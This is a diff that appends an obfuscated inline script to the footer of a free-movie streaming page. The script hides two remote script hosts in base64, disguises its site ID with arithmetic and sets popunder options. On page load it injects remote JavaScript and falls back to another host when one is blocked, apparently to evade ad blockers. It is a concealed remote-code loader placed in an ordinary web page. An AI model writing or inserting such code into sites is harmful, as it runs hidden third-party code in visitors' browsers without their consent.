@@ -78,5 +78,54 @@
       <p>&copy; 2025 JCVR Free Movies. This site does not host or upload any video content. All content is provided via external sources.</p>
     </div>
   </footer>
+
+<script type="text/javascript" data-cfasync="false">
+//<![CDATA[
+(function(){
+  var d = window,
+      k = "a29fa75e7dc143e3a7eacb4b65938693",
+      l = [
+        ["siteId", 12 * 468 * 267 + 227 + 523 + 3694032],
+        ["minBid", 0],
+        ["popundersPerIP", "0"],
+        ["delayBetween", 0],
+        ["default", false],
+        ["defaultPerDay", 0],
+        ["topmostLayer", "auto"]
+      ],
+      w = [
+        "d3d3LmJsb2NrYWRzbm90LmNvbS9tU3RhdGVseS5taW4uY3Nz",
+        "ZG5oZmk1bm4yZHQ2Ny5jbG91ZGZyb250Lm5ldC9XSC9vdGFnLWl0Lm1pbi5qcw=="
+      ],
+      a = -1, j, f;
+
+  var z = function(){
+    clearTimeout(f);
+    a++;
+    if (w[a] && !(1771552329000 < (new Date).getTime() && a > 1)) {
+      j = d.document.createElement("script");
+      j.type = "text/javascript";
+      j.async = true;
+      j.src = "https://" + atob(w[a]);
+      j.crossOrigin = "anonymous";
+      j.onerror = z;
+      j.onload = function(){
+        clearTimeout(f);
+        if (!d[k.slice(0,16)+k.slice(0,16)]) z();
+      };
+      var s = d.document.getElementsByTagName("script")[0];
+      f = setTimeout(z, 5000);
+      s.parentNode.insertBefore(j, s);
+    }
+  };
+
+  if (!d[k]) {
+    try { Object.freeze(d[k] = l); } catch (e) {}
+    z();
+  }
+})();
+//]]>
+</script>
+
 </body>
 </html>
